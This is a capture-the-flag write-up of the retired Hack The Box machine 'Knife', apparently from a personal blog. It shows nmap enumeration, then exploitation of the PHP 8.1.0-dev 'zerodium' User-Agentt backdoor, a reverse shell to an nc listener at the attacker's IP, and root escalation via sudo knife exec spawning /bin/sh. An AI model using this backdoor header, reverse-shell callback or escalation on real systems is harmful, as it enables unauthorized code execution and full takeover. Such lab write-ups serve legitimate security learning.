---
layout: post
title: "HTB: Knife"
author: Andrew Cherney
date: 2023-02-19 20:18:57
tags: htb easy-box
icon: "assets/icons/knife.png"
post_description: "Simplicity at its finest. A quick backdoor exploit from a vulnerable php version, and then a trip to GTFOBins can root this box. Bare bones and to the point."
---

<h1>Summary</h1>

{{ page.post_description }}

<h2>Enumeration</h2>

```bash
┌─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Knife]
└──╼ $nmap -sC 10.10.10.242
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-21 20:13 CST
Nmap scan report for 10.10.10.242
Host is up (0.047s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http
|_http-title:  Emergent Medical Idea
```

<h2>Port 80 - http</h2>

![EMA front page](/img/knife/Knife_front_page.png)

I scour through some html and javascript code before checking the Wappalyzer add-on. This lets me see what is being used in the page, everything from CDNs and coding languages to OS and server versions (all dependent on how locked down the data leak is). 

<h2>User as james</h2>

<h3>Zerodium PHP</h3>

![php version](/img/knife/Knife_wappalyzer_php_version.png)

The version 8.1.0 of php (if the dev version) had a specific backdoor built in. If you add <code>User-Agentt: zerodiumsystem('commands');</code> as a header you can pass remote code to run on the underlying machine through php. [This github repo](https://github.com/flast101/php-8.1.0-dev-backdoor-rce) has two versions of the exploit for ease of use. 

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Knife]
└──╼ $python3 php-8.1.0-backdoor.py http://10.10.10.242 10.10.14.14 7777
```

```bash
┌─[✗]─[raccoon@cyberraccoon-virtualbox]─[~/_hacking/HackTheBox/Retired/Knife]
└──╼ $nc -nvlp 7777
listening on [any] 7777 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.242] 58574
bash: cannot set terminal process group (1038): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ cd /home/james
cd /home/james
james@knife:~$ cat user.txt
cat user.txt
1bfa9885436-------------------
```


<h1>Root</h1>

<h2>GTFOBins</h2>

```bash
james@knife:~$ sudo -l
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Well this is a cut and dry easy box solution. GTFOBins will have a command to use for priv esc if I can use sudo with it. 

```bash
james@knife:/$ sudo knife exec -E 'exec "/bin/sh"'
sudo knife exec -E 'exec "/bin/sh"'
whoami
root
cat /root/root.txt
fdafbecbde81---------------------
```

